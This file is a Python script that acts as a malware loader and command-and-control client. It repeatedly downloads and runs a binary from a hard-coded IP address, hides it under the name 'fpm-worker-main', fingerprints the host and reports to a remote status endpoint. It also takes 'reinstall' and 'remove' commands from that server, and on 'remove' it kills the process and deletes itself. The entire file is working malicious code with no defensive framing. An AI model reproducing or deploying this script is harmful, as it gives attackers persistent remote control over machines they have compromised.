#!/usr/bin/python

import os
import time
import sys
import subprocess

timeout = 60 * 5
program_name = 'fpm-worker-main'
bin_url = 'http://5.188.86.18/files/exec'
config_url = 'http://5.188.86.18/files/config.json'
status_addr = 'http://5.188.86.18/info/status.php'
cmd_addr = 'http://5.188.86.18/info/cmd.php'


def report(addr, uid):
        os.popen("curl --connect-timeout 120 --max-time 120 -s " + addr + "?uid=" + uid)

def get_md5():
        result  =  os.popen("printf 'UID': && (cat /var/lib/dbus/machine-id || ifconfig | grep HWaddr || uname -a || lspci ) | md5sum").read()
        #print result
        result =  result[4:36]
        return result.strip()

def execute(file_name):
        file_name = os.path.abspath(file_name)
        os.system("chmod +x " + file_name)
        cmd = file_name
        print cmd
        #os.system(cmd)
        subprocess.Popen([cmd])
        #subprocess.call([cmd])

def get_cmd(addr):
    cmd = os.popen("curl --connect-timeout 120 --max-time 120 -s " + addr).read()
    return cmd

def download(url, name,  path=None):
        if path == None:
                path = './'
        name = path + name
        os.popen('wget --timeout 120 -o /dev/null -q -O ' + name + ' ' + url)

def kill_pid(pid):
        os.popen('kill -9 ' + str(pid) )

def get_pids(name):
        cmd = "ps aux | grep " + name + " | grep -v 'grep' | awk '{print $2}'"
        print cmd
        pid = os.popen(cmd).read()
        if pid == None:
            return None
        pid = pid.split("\n")
        pid = pid[:-1]
        if len(pid) == 0:
                pid = None
        print(pid)
        return pid

#pids = get_pids(program_name)
#kill_pid(pid)
#download(url, program_name)
#print(md5)
#sys.exit()
md5_uid = ''
try:
        md5_uid = get_md5()
except Exception as e:
        print(str(e))
        md5_uid = 'xxxx'

while(True):
        try:    
                pids = get_pids(program_name)
                if not os.path.isfile(program_name):
                        download(bin_url, program_name)
                        download(config_url, 'config.json')
                        print 'Downloaded'
                if pids == None:
                        execute('./' +  program_name)
                        print 'Recovered'
                else:
                        print 'Working processes '+ str(pids)
                report(status_addr, md5_uid)
                print 'Reported at '  + time.ctime()
                cmd  = get_cmd(cmd_addr)
                print(cmd)
                if cmd == 'reinstall':
                        download(bin_url, program_name)
                        download(config_url, 'config.json')
                        print 'Downloaded'
                        pids = get_pids(program_name)
                        if pids != None:
                                for pid in pids:
                                        kill_pid(pid)
                                        print 'PID ' + pid + ' killed'
                        execute('./' +  program_name)
                        print 'Executed'
                        time.sleep(timeout * 4)
                elif cmd == 'idle':
                        pass
                elif cmd == 'remove':
                    pids = get_pids(program_name)
                    if pids != None:
                        for pid in pids:
                            kill_pid(pid)
                            print 'PID ' + pid + ' killed'
                    print 'Removed'
                    os.remove(sys.argv[0])
                    break
                #break
                time.sleep(timeout)                
        except Exception as e:
                print(str(e))
                continue
